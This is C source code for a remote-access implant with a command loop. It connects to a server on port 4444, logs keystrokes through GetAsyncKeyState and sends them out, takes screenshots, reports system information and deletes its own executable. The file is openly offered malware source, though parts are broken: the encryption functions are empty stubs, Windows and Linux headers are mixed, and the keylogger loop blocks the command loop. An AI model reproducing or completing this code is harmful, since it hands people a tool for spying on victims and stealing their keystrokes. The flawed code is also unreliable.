#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/aes.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pwd.h>
#include <sys/ptrace.h>

// Server configuration
#define SERVER_IP "127.0.0.1" // Replace with the server IP
#define PORT 4444
#define AES_KEY_SIZE 256
#define BUFFER_SIZE 1024

// Global variables
int keylogger_active = 0;
unsigned char aes_key[AES_KEY_SIZE / 8];
unsigned char iv[12];

// AES-GCM encryption and decryption functions
void aes_gcm_encrypt(const unsigned char *plaintext, int plaintext_len, const unsigned char *key, const unsigned char *iv, unsigned char *ciphertext, unsigned char *tag) {
    // Implement AES-GCM encryption here
}

void aes_gcm_decrypt(const unsigned char *ciphertext, int ciphertext_len, const unsigned char *key, const unsigned char *iv, const unsigned char *tag, unsigned char *plaintext) {
    // Implement AES-GCM decryption here
}

// Self-destruction function
void self_destruct() {
    #ifdef _WIN32
        char self[MAX_PATH];
        GetModuleFileName(NULL, self, MAX_PATH);
        SetFileAttributes(self, FILE_ATTRIBUTE_NORMAL);
        DeleteFile(self);
    #endif

    #ifdef __linux__
        char self[BUFFER_SIZE];
        readlink("/proc/self/exe", self, BUFFER_SIZE);
        remove(self);
    #endif
    exit(EXIT_SUCCESS);
}

// Reconnection function
void reconnect(int *sock) {
    struct sockaddr_in serv_addr;
    for (int i = 0; i < 5; i++) {
        close(*sock);
        *sock = socket(AF_INET, SOCK_STREAM, 0);
        if (*sock < 0) {
            perror("Socket creation error");
            continue;
        }
        
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);

        if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
            perror("Invalid address");
            continue;
        }

        if (connect(*sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
            printf("Reconnected successfully\n");
            return;
        }

        perror("Reconnection attempt failed");
        sleep(5);
    }
    printf("Failed to reconnect. Exiting...\n");
    exit(EXIT_FAILURE);
}

// Keylogger function
void keylogger_start(int sock) {
    unsigned char buffer[BUFFER_SIZE];
    unsigned char encrypted[BUFFER_SIZE];
    unsigned char tag[16];

    while (keylogger_active) {
        for (unsigned char i = 1; i < 255; i++) {
            if (GetAsyncKeyState(i) & 0x0001) {
                sprintf((char *)buffer, "Key: %c\n", i);
                aes_gcm_encrypt(buffer, strlen((char *)buffer), aes_key, iv, encrypted, tag);
                send(sock, encrypted, sizeof(encrypted), 0);
                send(sock, tag, sizeof(tag), 0);
            }
        }
        Sleep(10);
    }
}

// Screenshot capture function
void capture_screenshot(const char *filename) {
    #ifdef _WIN32
        HDC hScreenDC = CreateDC("DISPLAY", NULL, NULL, NULL);
        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
        int width = GetDeviceCaps(hScreenDC, HORZRES);
        int height = GetDeviceCaps(hScreenDC, VERTRES);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
        HBITMAP hOldBitmap = (HBITMAP) SelectObject(hMemoryDC, hBitmap);

        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

        BITMAPFILEHEADER bmfHeader;
        BITMAPINFOHEADER bi;

        bmfHeader.bfType = 0x4D42; 
        bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (width * height * 4);
        bmfHeader.bfReserved1 = 0;
        bmfHeader.bfReserved2 = 0;
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = width;
        bi.biHeight = height;
        bi.biPlanes = 1;
        bi.biBitCount = 32;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;

        FILE *file = fopen(filename, "wb");
        fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, file);
        fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, file);
        unsigned char *data = (unsigned char *)malloc(width * height * 4);
        GetBitmapBits(hBitmap, width * height * 4, data);
        fwrite(data, width * height * 4, 1, file);
        free(data);
        fclose(file);

        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        DeleteDC(hScreenDC);
    #endif
}

// Function to gather system information
void gather_system_info(int sock) {
    char info[BUFFER_SIZE];
    
    #ifdef _WIN32
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        snprintf(info, sizeof(info), "OS: Windows\nProcessor Architecture: %d\nNumber of Processors: %u\n",
                 sysInfo.wProcessorArchitecture, sysInfo.dwNumberOfProcessors);
    #endif

    #ifdef __linux__
        struct utsname sysInfo;
        uname(&sysInfo);
        snprintf(info, sizeof(info), "OS: %s\nKernel Version: %s\n", sysInfo.sysname, sysInfo.release);
    #endif

    unsigned char encrypted[BUFFER_SIZE];
    unsigned char tag[16];
    aes_gcm_encrypt((unsigned char *)info, strlen(info), aes_key, iv, encrypted, tag);
    send(sock, encrypted, sizeof(encrypted), 0);
    send(sock, tag, sizeof(tag), 0);
}

// Main function to manage commands
int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;
    unsigned char command[BUFFER_SIZE];

    // Initialize socket and connection
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation error");
        exit(EXIT_FAILURE);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address");
        exit(EXIT_FAILURE);
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection failed");
        exit(EXIT_FAILURE);
    }

    // Main loop to receive commands from the server
    while (1) {
        memset(command, 0, sizeof(command));
        if (recv(sock, command, sizeof(command), 0) <= 0) {
            reconnect(&sock);
            continue;
        }

        if (strncmp((char *)command, "self_destruct", 13) == 0) {
            self_destruct();
        } else if (strncmp((char *)command, "start_keylogger", 15) == 0) {
            keylogger_active = 1;
            keylogger_start(sock);
        } else if (strncmp((char *)command, "stop_keylogger", 14) == 0) {
            keylogger_active = 0;
        } else if (strncmp((char *)command, "screenshot", 10) == 0) {
            capture_screenshot("screenshot.png");
        } else if (strncmp((char *)command, "system_info", 11) == 0) {
            gather_system_info(sock);
        }
    }

    close(sock);
    return 0;
}
